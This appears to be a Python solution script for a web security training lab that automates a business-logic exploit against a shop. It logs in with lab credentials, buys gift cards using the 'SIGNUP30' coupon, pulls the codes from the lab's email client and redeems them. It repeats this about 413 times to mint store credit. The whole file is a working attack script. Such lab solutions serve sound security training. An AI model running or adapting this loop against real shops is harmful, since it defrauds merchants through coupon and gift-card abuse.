import requests
import re
import urllib3
import sys

proxies = {
    # "https": "http://127.0.0.1:8080"
}

session = requests.session()
session.proxies.update(proxies)
session.verify = False

def login(login_url) -> bool:

    global session

    response = session.get(login_url)
    content = response.content.decode()

    regex = r'<input required type="hidden" name="csrf" value="(.*)">'
    match = re.search(regex, content)

    assert match is not None
    csrf = match.group(1)

    data = {
        "csrf": csrf,
        "username": "wiener",
        "password": "peter"
    }

    response = session.post(login_url, data=data, allow_redirects=False)

    assert response.status_code == 302 and response.headers['Location'] == "/my-account"


def add_item_to_cart(cart_url):

    global session

    data = {
        "productId": 2,
        "redir": "PRODUCT",
        "quantity": 1
    }

    response = session.post(cart_url, data=data, allow_redirects=False)
    content = response.content.decode()

    assert response.status_code == 302 and response.headers['Location'] == "/product?productId=2"


def apply_coupon(cart_url, coupon_url):

    global session

    response = session.get(cart_url)
    content = response.content.decode()

    regex = r'<input required type="hidden" name="csrf" value="(.*)">'
    match = re.search(regex, content)

    assert match is not None
    csrf = match.group(1)
    # print(csrf)

    data = {
        "csrf": csrf,
        "coupon": "SIGNUP30"
    }

    response = session.post(coupon_url, data=data, allow_redirects=False)
    content = response.content.decode()

    assert response.status_code == 302 and response.headers['Location'] == "/cart"


def checkout(cart_url, checkout_url):

    global session

    response = session.get(cart_url)
    content = response.content.decode()

    regex = r'<input required type="hidden" name="csrf" value="(.*)">'
    match = re.search(regex, content)

    assert match is not None
    csrf = match.group(1)
    # print(csrf)

    data = {
        "csrf": csrf
    }

    response = session.post(checkout_url, data=data)
    content = response.content.decode()

    assert response.status_code == 200 and "Your order is on its way!" in content


def get_gift_cards(email_client_url):

    response = requests.get(email_client_url)
    content = response.content.decode()

    regex = "Your gift card code is:\n\n(.*)\n\nThanks,\nSupport team"
    match = re.findall(regex, content)

    assert match is not None
    return match


def redeem_gift_card(account_url, gift_card_url, gift_card):

    global session

    response = session.get(account_url)
    content = response.content.decode()

    regex = r'<form id=gift-card-form class=login-form method=POST action=/gift-card>\s+<input required type="hidden" name="csrf" value="(.*)">'
    match = re.search(regex, content)

    assert match is not None
    csrf = match.group(1)
    # print(csrf)

    data = {
        "csrf": csrf,
        "gift-card": gift_card
    }

    response = session.post(gift_card_url, data=data, allow_redirects=False)
    content = response.content.decode()

    assert response.status_code == 302 and response.headers['Location'] == "/my-account"

def main():

    urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

    domain = "https://acec1f2a1f1814bec08b1f4500e900ef.web-security-academy.net"
    exploit_domain = "https://exploit-ac0c1fc51fea14e9c08a1fe3013e0039.web-security-academy.net"

    login_url = f"{domain}/login"
    cart_url = f"{domain}/cart"
    coupon_url = f"{domain}/cart/coupon"
    checkout_url = f"{domain}/cart/checkout"
    email_client_url = f"{exploit_domain}/email"
    gift_card_url = f"{domain}/gift-card"
    account_url = f"{domain}/my-account"

    times = ((1337 - 100) // 3) + 1

    for x in range(0, times):
    
        login(login_url)
        add_item_to_cart(cart_url)
        apply_coupon(cart_url, coupon_url)
        checkout(cart_url, checkout_url)
        gift_cards = get_gift_cards(email_client_url)
        redeem_gift_card(account_url, gift_card_url, gift_cards[0])

if __name__ == '__main__':
    main()
